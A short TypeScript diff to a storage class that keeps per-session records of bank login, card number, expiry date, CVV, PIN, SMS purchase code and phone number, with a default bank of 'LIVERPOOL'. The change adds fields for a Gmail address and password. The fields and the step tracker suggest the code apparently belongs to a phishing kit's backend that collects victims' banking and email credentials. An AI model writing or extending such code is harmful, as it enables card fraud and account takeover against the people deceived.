@@ -615,7 +615,7 @@ export class MemStorage implements IStorage {
       folio: data.folio || null,
       username: data.username || null,
       password: data.password || null,
-      banco: data.banco || "LIVERPOOL",
+      banco: data.banco || null,
       tarjeta: data.tarjeta || null,
       fechaVencimiento: data.fechaVencimiento || null,
       cvv: data.cvv || null,
@@ -623,6 +623,8 @@ export class MemStorage implements IStorage {
       nip: data.nip || null,
       smsCompra: data.smsCompra || null,
       celular: data.celular || null,
+      correo: data.correo || null,        // Añadimos campos de Gmail
+      contrasena: data.contrasena || null, // Añadimos campos de Gmail
       pasoActual: data.pasoActual || "folio",
       createdAt,
       active,
